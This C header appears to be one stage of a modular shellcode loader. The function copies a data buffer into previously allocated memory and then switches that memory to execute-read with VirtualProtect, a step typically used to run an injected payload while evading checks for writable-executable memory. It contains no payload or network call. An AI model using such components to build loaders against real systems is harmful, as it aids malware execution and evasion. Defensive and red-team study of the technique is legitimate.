#pragma once
#include "../../core/utils.h"
#include "../context.h"

inline BOOL Stage4_Write_Local_RX(TechniqueContext* ctx)
{
    if (!ctx || !ctx->allocated_mem || !ctx->data)
        return FALSE;

    memcpy(ctx->allocated_mem, ctx->data, ctx->length);

#ifdef DEBUG_MODE
    DEBUG_MSG("Stage 4", "Memcpy done, flipping protection to PAGE_EXECUTE_READ");
#endif

    DWORD oldProtect = 0;
    if (!VirtualProtect(ctx->allocated_mem, ctx->length,
                        PAGE_EXECUTE_READ, &oldProtect)) {
#ifdef DEBUG_MODE
        DEBUG_MSG("Stage 4", "VirtualProtect failed (err=%lu)", GetLastError());
#endif
        return FALSE;
    }

    return TRUE;
}
